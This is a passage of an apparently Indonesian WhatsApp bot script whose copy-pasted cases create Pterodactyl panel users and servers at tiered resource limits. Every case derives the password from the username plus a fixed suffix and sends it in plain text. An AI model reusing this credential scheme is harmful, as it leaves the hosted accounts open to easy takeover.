let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "2gb"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "50"
let disk = "2048"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE : BOT HANYA MENGIRIM DATA 1 KALI
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE YAH BANG KALO G MAU BANG THOMZ HAPUS
`)

}

break
case "3gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "3gb"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "70"
let disk = "3072"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE : BOT HANYA MENGIRIM DATA 1 KALI
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE DARI PADA BANG THOMZ HAPUS
`)

}
break
case "4gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4gb"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "90"
let disk = "4048"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE : BOT HANYA MENGIRIM DATA 1 KALI
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE YAH ASU NANTI DI HAPUS BANG THOMZ
`)

}

break
case "unli": {
    if (!isOwner) return reply(mess.only.owner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@thomzzz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomzganteng"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE : BOT HANYA MENGIRIM DATA 1 KALI
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE YAH ASU DI HAPU BANG THOMZ NANTI
`)

}

break
case "5gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "5gb"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "100"
let disk = "5138"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE : BOT HANYA MENGIRIM DATA 1 KALI
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}
break
case "6gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "6GB"
let egg = global.eggsnya
let loc = global.location
let memo = "6138"
let cpu = "120"
let disk = "6138"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}
break
case "7gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "7GB"
let egg = global.eggsnya
let loc = global.location
let memo = "7138"
let cpu = "140"
let disk = "7138"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}

break
case "8gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "8GB"
let egg = global.eggsnya
let loc = global.location
let memo = "8138"
let cpu = "160"
let disk = "8138"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}

break
case "9gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "9GB"
let egg = global.eggsnya
let loc = global.location
let memo = "9138"
let cpu = "180"
let disk = "9138"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}

break
case "10gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "10gb"
let egg = global.eggsnya
let loc = global.location
let memo = "10000"
let cpu = "200"
let disk = "10000"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup
haikal
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
